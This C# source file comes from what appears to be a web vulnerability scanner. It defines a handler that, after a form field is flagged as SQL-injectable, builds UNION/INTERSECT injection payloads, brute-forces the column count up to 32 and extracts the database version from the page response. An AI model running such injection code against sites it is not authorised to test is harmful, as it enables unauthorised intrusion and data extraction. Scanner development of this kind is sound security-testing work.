using iInject;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace iInjectProviders {
	/// <summary>
	/// Provides a vulnerability handler that attempts to detect the version of the database the vulnerability was found in.
	/// </summary>
	class VersionDetectionHandler : IVulnerabilityHandler {

		/// <summary>
		/// Gets the session that's being used for this provider.
		/// </summary>
		public InjectionSession Session { get; private set; }


		/// <summary>
		/// Gets the name of this provider.
		/// </summary>
		public string Name {
			get { return "Version Detection Handler"; }
		}

		/// <summary>
		/// Creates a new VersionDetectionHandler with the given session.
		/// </summary>
		public VersionDetectionHandler(InjectionSession Session) {
			this.Session = Session;
		}

		/// <summary>
		/// Handles an Sql Injection vulnerability by attempting to detect the version.
		/// </summary>
		public async void HandleVulnerability(VulnerabilityDetails Details) {
			IVulnerabilityScanner Scanner = Details.Scanner;
			if(Scanner.VulnerabilityName == Vulnerabilities.SQL_INJECTION) {
				var Parser = Session.Crawler.Parser;
				WebFormControl Control = Details.VulnerableControl;
				var OldValue = Control.Value;
				var NewValue = Control.GenerateDefaultValue(true);
				string StartVersionText = VulnerabilityHelpers.GetRandomAsciiString();
				string EndVersionText = new String(StartVersionText.Reverse().ToArray());
				try {
					// TODO: This is a terrible, terrible, hack.
					// We don't actually have a way of guaranteeing a column be output.
					// In fact, injection is usually in a where clause.
					// So, we'll try to do a union on the @@VERSION (SQL Server / MySQL / SQLite only, not Postgresql / Oracle)
					// But we need the right amount of columns and have no way of getting that.
					// So... we'll guess! Try from 1 to 32 until we get it right.
					// This is not something you'd ever actually use, but was part of our initial project goal.
					// Also, we want our value to be at the top, so we'll intersect nulls to be left with 0 values, then union version strings.
					for(int i = 1; i <= 32; i++) {
						string UnionString = "'" + StartVersionText + "' + @@VERSION";
						string Query = Control.Value;
						Query = NewValue + "' INTERSECT SELECT ";
						for(int j = 0; j < i; j++)
							Query += "NULL, ";
						Query = Query.Substring(0, Query.Length - 2);
						Query += " UNION ALL SELECT ";
						for(int j = 0; j < i; j++)
							Query += UnionString + ", ";
						Query = Query.Substring(0, Query.Length - 2);
						Query += " + '" + EndVersionText + "'--";
						Control.Value = Query;
						var Response = await Details.Form.SubmitAsync(Parser, TimeSpan.FromSeconds(30));
						if((int)Response.StatusCode == 200) {
							string Raw = Response.RawText;
							int StartIndex = Raw.IndexOf(StartVersionText);
							int EndIndex = Raw.IndexOf(EndVersionText);
							if(StartIndex != -1 && EndIndex != -1) {
								string Version = Raw.Substring(StartIndex + StartVersionText.Length, EndIndex - StartIndex - StartVersionText.Length);
								// TODO: This needs to use a logger.
								Console.WriteLine("Affected database version was '" + Version + "'.");
								break;
							}
						}
					}
				} finally {
					Control.Value = OldValue;
				}
			}
		}
	}

}